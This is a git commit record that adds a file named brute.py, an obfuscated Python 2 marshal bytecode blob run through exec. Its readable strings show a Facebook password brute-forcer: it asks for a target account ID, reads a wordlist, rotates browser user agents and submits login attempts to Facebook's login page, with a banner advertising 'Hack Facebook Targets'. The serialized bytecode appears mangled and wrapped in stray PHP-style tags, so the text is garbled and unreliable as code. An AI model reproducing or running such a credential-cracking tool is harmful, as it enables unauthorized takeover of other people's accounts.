d58f80d2650eb58344abbc78a2664f16d0343174
mrw3w3n <68137152+mrwawanj@users.noreply.github.com>
2021-01-25 05:54:41 +0700

    Update and rename facebook.py to brute.py

---
+++ brute.py
@@ -0,0 +1,68 @@
+<?  import marshal
+exec(marshal.loads('c@sddlZddlZddlZddlZddlZddlZejddZejdks|ejdkrdZ	dZ
+dZd	Zd
+Z
+dZdZd
+ZdZdZd
+ZdZdZe
+eee
+eefZejeZndZeeeedededZeeedededZdZdgZdZdZ dZ!dZ"dZ#dZ$e%dkre ndS( iNtclearcCsGx@|dD]4}tjj|tjjtjddqWdS(Ns
+g$@id(tsyststdouttwritetflushttimetsleep(tstc((ttrunntek
+s
+tlinuxtlinux2s[96;1ms[34;1ms[33;1ms[32;1ms[0;1ms[31;1ms[36;1ms[34ms[32ms[31mcCsdGHttdtjddGHtdGHtdtdtdGHtdtd	td
+GHtdtdtd
+GHtdtdtdtdGHtdtdGHtdtdtdtdGHtdtdtdtdGHtdGHtdGHdS(Ns
+    
+    
+    
+    
+     s      [-_-] HALLO BANGSAT [-_-]it s      s     s       AUTHOR : s Riski Darmawans       GITHUB : s https://github.com/FR13ND8s$s
+    WA     : s
+ 085835787069sss   FUNGSI : s Hack Facebook Nargetss   >> s JANGAN RECODE YA BANGSATs CAPEK GUA BUATNYA BANGSATs\'(R
+tGLRRtWWtRtB(((R	tcover#s
+	!!!	s[?]s Masukkan ID Targets : s KETIK password.txts2https://www.facebook.com/login.php?login_attempt=1sDMozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0s8Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) GeckcCsGx@|dD]4}tjj|tjjtjddqWdS(Ns
+g$@id(RRRRRR(RR((R	R
+Is
+cCstjatj}tjttjttj	|tj
+ttjttjtj
+jddtttdGHttdttdtjdtdGHdS(	Ntmax_timeiR
+sMAAF PASSWORD TIDAK DI TEMUKANs#BUATLAH LAGI password/Wordlist Kamuis[-_-] s[-_-] [-_-] [-_-] (t	mechanizetBrowsertbrt	cookielibtLWPCookieJartset_handle_robotstFalsetset_handle_redirecttTruet
+set_cookiejartset_handle_equivtset_handle_referertset_handle_refresht_httptHTTPRefreshProcessortwelcometlagitsearchR
+RRRR(tcj((R	tmainOs 
+
+
+
+
+
+cCstjjtdj|tjjdtjtfgt	_
+t	jt}t	j
+ddtt	jd<|t	jd<t	j}|j}|tkrd|krdj|GHd	GHttd
+tjdndS(Ns
+[+]  Mencoba..... {}s
+User-agenttnritemailtpasst
+login_attempts@[92;1m
+
+[+][97;1m INI ADALAH PASSWORDNYA [31;1m===> [96;1m{}R
+s#......TEKAN ENTER UNTUK KELUAR.....i(RRRtWtformatRtrandomtchoicet
+useragentsRt
+addheaderstopentlogintselect_formR)tformtsubmittgeturlt	raw_inputtCCtexit(tpasswordtsitetsubtlog((R	tbrutebs
+
+
+cCs@ttd}x*|D]"atjdd}ttqWdS(Ntrs
+R	(R2tpasswordlistR;treplaceR?(t	passwords((R	R%ss
+cCs
+tdGHdS(Ns
+     
+       INDONESIA DARK TERMUX ASSOCIATE   
+     
+     |              |
+     |              |
+     |               |
+     |                |
+     ||
+      (tGG(((R	R#|s	cCsUttd}|j}tdjtGHtdGt|GtdGHtdGHdS(NR@s     [*] Account to crack : {}s     [*] JUMLAH WORDLIST  :RCs+     [*] LAGI CRACKING MOHON TUNGGU .....
+
+(R2RAt	readlinesRR-R)tlen(ttotal((R	R$s
+t__main__(sDMozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0s8Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck(&tosRRRR.RtsystemR
+tplatformRtBBtYYRDRtRRR9RtYtGR,RtCtrandR/tPRtstrR8R)RAR3R0R\'R?R%R#R$t__name__(((R	t<module>sJ
+		&&								')) ?>
